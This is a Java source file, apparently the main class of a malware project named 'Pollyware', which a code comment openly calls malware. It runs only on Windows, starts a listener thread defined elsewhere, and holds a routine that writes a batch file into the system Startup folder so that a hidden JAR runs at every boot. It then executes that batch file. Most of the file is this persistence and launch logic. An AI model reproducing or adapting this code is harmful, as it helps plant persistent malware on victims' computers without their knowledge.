package me.aaronakhtar.pollyware;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class Pollyware {                    //  START /B program

    private static Map<String, Object> getConfigParams(){
        File file = new File(new Pollyware().getClass().getClassLoader().getResource("config.txt").getFile());
        Map<String, Object> params = new HashMap<String, Object>();

        try{
            for (String f : Files.readAllLines(Paths.get(file.getAbsolutePath()))){
                String[] a = f.split(":");
                params.put(a[0], a[1]);
            }
        }catch (Exception e){

        }

        return params;
    }

    public static Object getConfigParam(String key){
        return getConfigParams().get(key);
    }

    /*
    FOR PERSISTENCE TO WORK MALWARE
    JAR MUST BE IN CORRESPONDING FOLDER
    AS PERSISTENCE BAT AND MUST BE NAMED "POLLV1.jar"!
     */
    private static void createPersistenceBat(){
        final File bat = new File("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\polly-startup-v1.bat");
        try{
            if (!bat.exists()) {
                bat.createNewFile();
                FileWriter writer = new FileWriter(bat);
                writer.write("START /B " + bat.getParentFile() + "\\POLLV1.jar");
                writer.flush();
                writer.close();
            }
        }catch (Exception e){

        }
    }

    private static File getPersistenceBat(){
        return new File("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\polly-startup-v1.bat");
    }

    public static void main(String[] args){
        if (!System.getProperty("os.name").toLowerCase().contains("windows")){
            return;
        }

        Threads.listen().start();
        //createPersistenceBat();
        if (getPersistenceBat().exists()){
            try {
                Runtime.getRuntime().exec(getPersistenceBat().getAbsolutePath());
            }catch (Exception e){

            }
        }




    }

}
